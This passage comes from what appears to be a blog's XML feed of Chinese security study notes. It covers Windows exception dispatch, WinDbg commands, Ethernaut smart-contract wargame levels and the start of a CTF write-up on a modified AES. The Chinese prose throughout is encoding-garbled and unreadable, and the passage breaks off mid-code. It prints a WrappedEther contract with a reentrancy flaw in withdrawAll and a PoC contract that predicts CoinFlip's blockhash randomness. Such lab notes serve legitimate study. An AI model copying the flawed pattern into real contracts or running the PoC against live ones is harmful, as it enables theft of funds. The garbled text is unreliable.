<code>kiDispathException</code>å‡½æ•°æ¥è¿›è¡Œå¼‚å¸¸åˆ†å‘ï¼›<br>å½“å†…æ ¸äº§ç”Ÿå¼‚å¸¸æ—¶ï¼Œç¨‹åºå¤„ç†æµç¨‹è¿›å…¥åˆ° <code>KiDispatchException</code>å‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°å†…å¤‡ä»½å½“å‰çº¿ç¨‹ R3 çš„ <code>TrapFrame</code>ï¼ˆå³æ ˆå¸§çš„åŸºå€ï¼‰ã€‚å¼‚å¸¸å¤„ç†é¦–å…ˆåˆ¤æ–­è¿™æ˜¯å¦æ˜¯ç¬¬ä¸€æ¬¡å¼‚å¸¸ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨å†…æ ¸è°ƒè¯•å™¨ï¼Œå¦‚æœæœ‰å†…æ ¸è°ƒè¯•å™¨ï¼Œåˆ™æŠŠå½“å‰çš„å¼‚å¸¸ä¿¡æ¯å‘é€ç»™å†…æ ¸è°ƒè¯•å™¨ï¼›å¦‚æœæ²¡æœ‰å†…æ ¸è°ƒè¯•å™¨æˆ–è€…å†…æ ¸è°ƒè¯•å™¨æ²¡æœ‰å¤„è¯¥å¼‚å¸¸ ï¼Œ åˆ™è¿›å…¥æ­¥éª¤3ï¼Œè°ƒç”¨ <code>RtlDispatchException</code>ã€‚<br>å†…æ ¸å¼‚å¸¸è¿›å…¥ <code>RtlDispatchException</code> å‡½ æ•°ï¼Œ å¦‚æœ<code>RtlDispatchException</code> å‡½æ•°æ²¡æœ‰å¤„ç†è¯¥å¼‚å¸¸ï¼Œé‚£ä¹ˆå°†å†æ¬¡å°è¯•å°†å¼‚å¸¸å‘é€åˆ°å†…æ ¸è°ƒè¯•å™¨ï¼Œå¦‚æœæ­¤æ—¶å†…æ ¸è°ƒè¯•å™¨ä»ç„¶ä¸å­˜åœ¨æˆ–è€…æ²¡æœ‰å¤„ç†è¯¥å¼‚å¸¸ï¼Œé‚£ä¹ˆæ­¤æ—¶ç³»ç»Ÿä¼šç›´æ¥è“å±ï¼›<br>å¦‚æœæ˜¯ç”¨æˆ·æ€å¼‚å¸¸åˆ™ç»è¿‡ <code>KiDispatchException</code>è¿›è¡Œç”¨æˆ·æ€å¼‚å¸¸åˆ†å‘å’Œå¤„ç†ã€‚å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡åˆ†å‘å¼‚å¸¸ï¼Œåˆ™è°ƒç”¨ <code>DbgKForwardException</code>å°†å¼‚å¸¸åˆ†å‘åˆ°å†…æ ¸è°ƒè¯•å™¨ï¼›å¦‚æœå†…æ ¸è°ƒè¯•å™¨ä¸å­˜åœ¨æˆ–æ²¡æœ‰å¤„ç†å¼‚å¸¸ï¼Œåˆ™å°è¯•å°†å¼‚å¸¸åˆ†å‘ç»™ç”¨æˆ·æ€è°ƒè¯•å™¨ï¼›å¦‚æœå¼‚å¸¸è¢«å¤„ç†ï¼Œåˆ™è¿›å…¥æ­¥éª¤10ï¼›å¦‚æœç”¨æˆ·æ€è°ƒè¯•å™¨ä¸å­˜åœ¨æˆ–æœªå¤„ç†å¼‚å¸¸ï¼Œåˆ™æ£€æµ‹æ˜¯å¦æ˜¯ç¬¬ä¸€æ¬¡å¤„ç†å¼‚å¸¸ï¼Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡å¤„ç†å¼‚å¸¸åˆ™è¿›å…¥ç¬¬5æ­¥ä¸­çš„å¼‚å¸¸æ•°æ®å‡†å¤‡ï¼›<br>å‡†å¤‡ä¸€ä¸ªè¿”å›ntdll!<code>KiUserExceptionDispatcher</code> å‡½æ•°çš„åº”ç”¨å±‚è°ƒç”¨æ ˆï¼Œç»“æŸæœ¬æ¬¡<code>KiDispatchException</code> å‡½æ•°çš„è¿è¡Œï¼Œè°ƒç”¨<code>KiServiceExit</code> è¿”å›ç”¨æˆ·å±‚ã€‚æ­¤æ—¶å‡½æ•°æ ˆå¸§æ˜¯ntdll!<code>KiUserExceptionDispatcher</code>çš„æ‰§è¡Œç¯å¢ƒï¼Œç”¨æˆ·æ€çº¿ç¨‹ä»æ‰§è¡Œ ntdll!<code>KiUserExceptionDispatcher</code> å¼€å§‹æ‰§è¡Œã€‚è¯¥å‡½æ•°è°ƒç”¨ ntdll!RtlDispatchExceptionè¿›è¡Œå¼‚å¸¸çš„åˆ†å‘ï¼Œè¿›å…¥ç¬¬ 6 æ­¥ï¼›<br>é€šè¿‡ <code>RtlCallVectoredExceptionHandlers</code>éå† VEHé“¾è¡¨å°è¯•æŸ¥æ‰¾å¼‚å¸¸å¤„ç†å‡½æ•°ï¼›å¦‚æœ VEHæœªå¤„ç†å¼‚å¸¸ã€‚åˆ™ä» fs[0]è¯»å– ExceptionListå¹¶å¼€å§‹æ‰§è¡Œ SEH å‡½æ•°å¤„ç†ï¼Œè¿›å…¥æ­¥éª¤7ï¼›<br>å¦‚æœSEHæ²¡æœ‰å¤„ç†å‡½æ•°å¤„ç†è¯¥å¼‚å¸¸ï¼Œåˆ™æ£€æŸ¥ç”¨æˆ·æ˜¯å¦é€šè¿‡<code>SetUnhandledExceptionFilter</code>å‡½æ•°æ³¨å†Œè¿‡è¿›ç¨‹çš„å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œå¦‚æœç”¨æˆ·æ³¨å†Œè¿‡å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œè°ƒç”¨è¯¥å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œå¦‚æœå¼‚å¸¸æ²¡æœ‰è¢«æˆåŠŸå¤„ç†æˆ–æ²¡æœ‰è‡ªå®šä¹‰çš„å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œåˆ™è¿›å…¥æ­¥éª¤3ï¼›<br>å¦‚æœæœ€åä»æ²¡æœ‰å¤„ç†è¯¥å¼‚å¸¸ï¼Œä¾¿ä¼šä¸»åŠ¨è°ƒç”¨ <code>NtRaiseException</code>å°†è¯¥å¼‚å¸¸é‡æ–°è·‘å‡ºæ¥ï¼Œä½†æ˜¯æ­¤æ—¶ä¸æ˜¯ç¬¬ä¸€æ¬¡åˆ†å‘ï¼Œæ­¤æ—¶ <code>NtRaiseException</code>æµç¨‹é‡æ–°è°ƒç”¨äº† ntdll!<code>KiDispatchException</code>ï¼Œå¹¶å†æ¬¡è¿›å…¥ç”¨æˆ·æ€å¼‚å¸¸çš„å¤„ç†åˆ†æ”¯ï¼Œè¿›å…¥æ­¥éª¤9ï¼›<br>ç¬¬äºŒæ¬¡è¿›å…¥ç”¨æˆ·æ€å¼‚å¸¸å¤„ç†æ—¶ï¼Œä¸ä¼šå†å°è¯•å‘é€åˆ°å†…æ ¸è°ƒè¯•å™¨ï¼Œä¹Ÿä¸ä¼šå†è¿›è¡Œå¼‚å¸¸åˆ†å‘ï¼Œè€Œæ˜¯ç›´æ¥å°è¯•å‘é€åˆ°ç”¨æˆ·æ€ä½“å¼‚å¸¸è°ƒè¯•å™¨ï¼Œå¦‚æœæœ€åå¼‚å¸¸ä»æœªè¢«å¤„ç†åˆ™è¿›å…¥æ­¥éª¤11ï¼›<br>å¼‚å¸¸è¢«å¤„ç†ï¼Œè°ƒç”¨ NtContineï¼Œå°†ä¹‹å‰ä¿å­˜çš„ TrapFrameè¿˜åŸï¼Œç¨‹åºç»§ç»­ä»å¼‚å¸¸å¤„æ­£å¸¸è¿è¡Œï¼›<br>å¼‚å¸¸ä¸èƒ½è¢«å¤„ç†ï¼Œç³»ç»Ÿè°ƒç”¨ ntdll!<code>KiDispatchException</code> è°ƒç”¨ ZeTerminateProcessç»“æŸè¿›ç¨‹ã€‚</p></blockquote><hr><h2 id="WinDbgå¸¸è§æŒ‡ä»¤">WinDbgå¸¸è§æŒ‡ä»¤</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">t step into</span><br><span class="line">p step over</span><br><span class="line">g run</span><br><span class="line">g <span class="keyword">addr </span>è½¬åˆ°æŒ‡å®šä½ç½®</span><br><span class="line"><span class="keyword">bp </span><span class="keyword">addr </span>ä¸‹è½¯ä»¶æ–­ç‚¹</span><br><span class="line"><span class="keyword">ba </span><span class="keyword">addr </span>ä¸‹ç¡¬ä»¶æ–­ç‚¹</span><br><span class="line">r æ˜¾ç¤ºå¯„å­˜å™¨</span><br><span class="line">r register æ˜¾ç¤ºæŒ‡å®šå¯„å­˜å™¨</span><br><span class="line">u æ˜¾ç¤ºä¸‹ä¸€æ¡æŒ‡ä»¤</span><br><span class="line">u <span class="keyword">addr </span>çœ‹å¯¹åº”åœ°å€æŒ‡ä»¤</span><br><span class="line">u L10 æ˜¾ç¤ºä¸‹<span class="number">10</span>è¡ŒæŒ‡ä»¤</span><br><span class="line">ub æ˜¾ç¤ºä¸Šä¸€æ¡æŒ‡ä»¤</span><br><span class="line">k çœ‹æ ˆå›æº¯</span><br><span class="line">~* çœ‹å½“å‰çº¿ç¨‹</span><br><span class="line">~num k çœ‹æŸä¸ªï¼ˆåºå·ä¸ºnumï¼‰çº¿ç¨‹çš„æ ˆå›æº¯</span><br><span class="line">x moduleName!*funcName åœ¨å¯¹åº”ä½ç½®è®¾ç½®æ–­ç‚¹</span><br><span class="line"><span class="keyword">bp </span>moduleName!funcName <span class="string">&quot;æŒ‡ä»¤&quot;</span> æ–­ç‚¹å‘½ä¸­åæ‰§è¡ŒæŒ‡ä»¤,æ¯”å¦‚<span class="string">&quot;.echo *********;k;gc&quot;</span>è‡ªåŠ¨kç„¶ågo</span><br><span class="line">sxe ld æ¨¡å—åŠ è½½æ—¶åœæ­¢</span><br><span class="line">lm æ˜¾ç¤ºåŠ è½½çš„æ¨¡å—</span><br><span class="line">dt (<span class="keyword">display </span>type)æ˜¾ç¤ºç±»å‹</span><br><span class="line">dt struct name æ˜¾ç¤ºç»“æ„æˆå‘˜</span><br><span class="line">dt struct name <span class="keyword">address </span>å°†ç›®æ ‡åœ°å€å½“ä½œç»“æ„ä½“æ˜¾ç¤º</span><br></pre></td></tr></table></figure><p>ä»¥Noninvasiveæ¨¡å¼å¯ä»¥åªè¯»çš„å½¢å¼é™„åŠ </p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><a href="https://www.bilibili.com/video/BV1A4411D7xx?p=2">2.æ¦‚è§ˆå’Œè½¯ä»¶æ–­ç‚¹_å“”å“©å“”å“©_bilibili</a></p><p><a href="https://zhuanlan.zhihu.com/p/573449712">windows SEHåˆ†æ - çŸ¥ä¹</a></p><p><a href="https://blog.csdn.net/LPWSTR/article/details/78714486?spm=1001.2014.3001.5501">Windowså¼‚å¸¸ä¸–ç•Œå†é™©è®°ï¼ˆäºŒï¼‰â€”â€”Win32ç”¨æˆ·å±‚ä¸‹SEHæœºåˆ¶ä¹‹å¯¹RtlUnwindçš„é€†å‘åˆ†æ-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> Winå†…æ ¸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŒºå—é“¾å®‰å…¨1-åšé¢˜</title>
      <link href="/posts/2967681d.html"/>
      <url>/posts/2967681d.html</url>
      
        <content type="html"><![CDATA[<h2 id="level4-Telephone">level4 Telephone</h2><p>tx.addræ˜¯åŸå§‹è°ƒç”¨è€…<br>msg.senderæ˜¯è°ƒç”¨è¿™ä¸ªåˆçº¦çš„è°ƒç”¨è€…</p><p>å¯ä»¥é€šè¿‡è®©åˆçº¦è°ƒç”¨åˆçº¦æ¥å®ç°tx.originä¸ç­‰äºmsg.sender</p><h2 id="level5-Token">level5 Token</h2><p>å‡æ³•å’ŒåŠ æ³•æœ‰æº¢å‡ºï¼Œä½†æ˜¯0.8ç‰ˆæœ¬æœ‰å†…ç½®çš„æ£€æŸ¥</p><h2 id="level6-Delegation">level6 Delegation</h2><p>fallbackå‡½æ•°<br>å‡½æ•°é€‰æ‹©å™¨<br>åº•å±‚é€šè¿‡ä¸åŒçš„å€¼é€‰æ‹©ä¸åŒçš„å‡½æ•°æ‰§è¡Œï¼Œä»è€Œå®ç°æ‰§è¡Œä¸åŒçš„åˆçº¦çš„å‡½æ•°</p><p>å§”æ‰˜è°ƒç”¨ï¼Œç›´æ¥æ‰§è¡Œç›®æ ‡ä»£ç çš„æœºå™¨ç </p><h2 id="level7-Force">level7 Force</h2><p>å¦‚æœä¸€ä¸ªåˆçº¦æ²¡æœ‰receiveå‡½æ•°ï¼Œé‚£ä¹ˆå°±ä¸èƒ½å‘è¿™ä¸ªåˆçº¦è½¬è´¦</p><p>ä½†æ˜¯æœ‰ä¸€ä¸ªè‡ªæ¯å‡½æ•°å¯ä»¥æŠŠæœ¬åˆçº¦é”€æ¯ç„¶åå°†è‡ªèº«ä»¥å¤ªå¸å‘é€åˆ°æŒ‡å®šåœ°å€</p><p>selfdestruct(payable _(_to))</p><h2 id="level8-Vault">level8 Vault</h2><p>åˆçº¦ä¸Šçš„æ‰€æœ‰å†…å®¹éƒ½æ˜¯å…¬å¼€çš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é€šè¿‡æŸ¥çœ‹äº¤æ˜“è®°å½•å¾—åˆ°æ¯ä¸€ä¸ªå­˜æ”¾çš„å€¼</p><h3 id="solidityå†…å­˜æ’å¸ƒ">solidityå†…å­˜æ’å¸ƒ</h3><p>ç”±å˜é‡å£°æ˜é¡ºåºç”±ä¸Šè‡³ä¸‹ç”³è¯·ç©ºé—´ï¼Œæ¯ä¸ªæ’æ§½32byteï¼Œå¦‚æœæ’æ§½ä½ç½®ä¸å¤Ÿäº†ï¼Œå°±æ–°ç”³è¯·ä¸€ä¸ªï¼Œæ”¾åœ¨æ–°ç”³è¯·çš„é‡Œé¢</p><p>æ•°ç»„ï¼Œé€šè¿‡è®¡ç®—keccakÂ§å¾—åˆ°åˆå§‹åœ°å€ï¼Œç„¶åå†å¢åŠ indexå€¼</p><h2 id="é‡å…¥æ”»å‡»">é‡å…¥æ”»å‡»</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.20;</span><br><span class="line"></span><br><span class="line">interface IWrappedEther &#123;</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 amount);</span><br><span class="line">    event Approval(</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    );</span><br><span class="line">    event Deposit(address indexed from, uint256 amount);</span><br><span class="line">    event Withdraw(address indexed to, uint256 amount);</span><br><span class="line"></span><br><span class="line">    function deposit(address to) external payable;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) external;</span><br><span class="line"></span><br><span class="line">    function withdrawAll() external;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) external;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) external;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function allowance(</span><br><span class="line">        address owner,</span><br><span class="line">        address spender</span><br><span class="line">    ) external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract WrappedEther is IWrappedEther &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    function deposit(address to) external payable &#123;</span><br><span class="line">        balanceOf[to] += msg.value;</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) external &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= amount, &quot;insufficient balance&quot;);</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        sendEth(payable(msg.sender), amount);</span><br><span class="line">        emit Withdraw(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdrawAll() external &#123;</span><br><span class="line">        sendEth(payable(msg.sender), balanceOf[msg.sender]);</span><br><span class="line">        balanceOf[msg.sender] = 0;</span><br><span class="line">        emit Withdraw(msg.sender, balanceOf[msg.sender]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 amount) external &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= amount, &quot;insufficient balance&quot;);</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        balanceOf[to] += amount;</span><br><span class="line">        emit Transfer(msg.sender, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external &#123;</span><br><span class="line">        require(balanceOf[from] &gt;= amount, &quot;insufficient balance&quot;);</span><br><span class="line">        require(</span><br><span class="line">            allowance[from][msg.sender] &gt;= amount,</span><br><span class="line">            &quot;insufficient allowance&quot;</span><br><span class="line">        );</span><br><span class="line">        balanceOf[from] -= amount;</span><br><span class="line">        balanceOf[to] += amount;</span><br><span class="line">        allowance[from][msg.sender] -= amount;</span><br><span class="line">        emit Transfer(from, to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) external &#123;</span><br><span class="line">        allowance[msg.sender][spender] = amount;</span><br><span class="line">        emit Approval(msg.sender, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendEth(address payable to, uint256 amount) private &#123;</span><br><span class="line">        (bool success, ) = to.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;failed to send ether&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨withdrawAllçš„æ—¶å€™è§¦å‘ï¼Œå…ˆè½¬è´¦ï¼Œåwithdrawï¼Œæ‰€ä»¥å¯ä»¥åœ¨receiveå†è°ƒç”¨è¿™ä¸ªwithdrawAllå‡½æ•°å¯¼è‡´å¤šæ¬¡æ‰§è¡Œæ“ä½œã€‚</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> åŒºå—é“¾ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŒºå—é“¾ </tag>
            
            <tag> Solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŒºå—é“¾å®‰å…¨0-å…¥é—¨</title>
      <link href="/posts/3cedd4ae.html"/>
      <url>/posts/3cedd4ae.html</url>
      
        <content type="html"><![CDATA[<h1>äº¤äº’</h1><h2 id="ä»¥å¤ªåŠç”Ÿæ€">ä»¥å¤ªåŠç”Ÿæ€</h2><p>ä»¥å¤ªåŠæ˜¯ä¸€ä¸ªå»ä¸­å¿ƒåŒ–,å¼€æºä¸”å…·å¤‡æ™ºèƒ½åˆçº¦åŠŸèƒ½çš„å…¬å…±åŒºå—é“¾å¹³å°.</p><h2 id="MetaMask">MetaMask</h2><p>é’±åŒ…</p><h2 id="åŠ©è®°è¯-Seed-ç§é’¥-å…¬é’¥-åœ°å€">åŠ©è®°è¯/Seed/ç§é’¥/å…¬é’¥/åœ°å€</h2><p>åŠ©è®°è¯â€”Seedç§å­(å¯é€†)<br>ç”Ÿæˆç§é’¥(å•å‘)<br>ç”Ÿæˆå…¬é’¥<br>ç”Ÿæˆåœ°å€</p><h2 id="è½¬è´¦">è½¬è´¦</h2><h2 id="æ™ºèƒ½åˆçº¦">æ™ºèƒ½åˆçº¦</h2><p>ä½¿ä»¥å¤ªç½‘ç”Ÿæ€æœ‰å›¾çµå®Œå¤‡æ€§</p><h3 id="REMIX">REMIX</h3><p>ä½¿ç”¨çš„è¯­è¨€:solidity</p><p>inject Provider - MetaMask<br>è¿æ¥Remixå’ŒMetaMask</p><h1>åˆ·é¢˜</h1><p><a href="https://ethernaut.openzeppelin.com/level/1">The Ethernaut - Fallback</a></p><h3 id="Fallback">Fallback</h3><p>æ™ºèƒ½åˆçº¦ä¹Ÿæ˜¯è´¦æˆ·ï¼Œå¯ä»¥ç›´æ¥è½¬è´¦</p><h3 id="Fallout">Fallout</h3><p>é™¤äº†constructorå‡½æ•°ä»¥å¤–ï¼Œæ‰€æœ‰å‡½æ•°éƒ½å¯ä»¥è°ƒç”¨ï¼Œåœ¨0.8ç‰ˆæœ¬ä¹‹å‰ï¼Œå¦‚æœæ‹¼é”™äº†æ„é€ å‡½æ•°ï¼Œä¼šå¯¼è‡´è¿™ä¸ªå‡½æ•°å¯ä»¥è¢«ç›´æ¥è°ƒç”¨</p><h3 id="Coin-Flip">Coin Flip</h3><p>ç”±äºåŒºå—é“¾ä¸­çš„å¾ˆå¤šæ•°æ®æ˜¯å¯¹æ‰€æœ‰äººå¯è§çš„ï¼ŒåŸºäºè¿™äº›å¯è§æ•°æ®è¿›è¡Œçš„ä¼ªéšæœºå¯ä»¥å¾ˆè½»æ¾åœ°è¢«é¢„æµ‹åˆ°ä¸‹ä¸€ä¸ªéšæœºæ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract PoC &#123;</span><br><span class="line">    CoinFlip target;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor(address _target)&#123;</span><br><span class="line">        target = CoinFlip(_target);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function flip() public &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        target.flip(side);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> åŒºå—é“¾ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŒºå—é“¾ </tag>
            
            <tag> Solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¹˜å²šæ¯RE-å¤ç°&lt;1997&gt;</title>
      <link href="/posts/b119ee64.html"/>
      <url>/posts/b119ee64.html</url>
      
        <content type="html"><![CDATA[<h2 id="1997">1997</h2><p>è¿™ä¸ªé¢˜æ˜¯ä¸€ä¸ªé­”æ”¹çš„AESï¼Œå…·ä½“é€»è¾‘å¾ˆæ¸…æ¥šï¼Œç”šè‡³è¿˜æœ‰ç¬¦å·è¡¨</p><p>ä½†æ˜¯ä¸­é—´è¿™é‡Œæ²¡æƒ³åˆ°æœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥é€†å‘ï¼Œæ‰€ä»¥ç›´æ¥çˆ†ç ´äº†</p><p>åˆ—æ··æ·†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; i += <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">  t = tmp[i + <span class="number">2</span>] ^ tmp[i + <span class="number">1</span>] ^ tmp[i] ^ tmp[i + <span class="number">3</span>];</span><br><span class="line">  ciphertext[i] = t ^ tmp[i] ^ mul2(tmp[i] ^ tmp[i + <span class="number">1</span>]);</span><br><span class="line">  ciphertext[i + <span class="number">1</span>] = t ^ tmp[i + <span class="number">1</span>] ^ mul2(tmp[i + <span class="number">1</span>] ^ tmp[i + <span class="number">2</span>]);</span><br><span class="line">  ciphertext[i + <span class="number">2</span>] = t ^ tmp[i + <span class="number">2</span>] ^ mul2(tmp[i + <span class="number">2</span>] ^ tmp[i + <span class="number">3</span>]);</span><br><span class="line">  ciphertext[i + <span class="number">3</span>] = t ^ tmp[i + <span class="number">3</span>] ^ mul2(tmp[i + <span class="number">3</span>] ^ tmp[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span> __cdecl <span class="title function_">mul2</span><span class="params">(<span class="type">uint8_t</span> a)</span></span><br><span 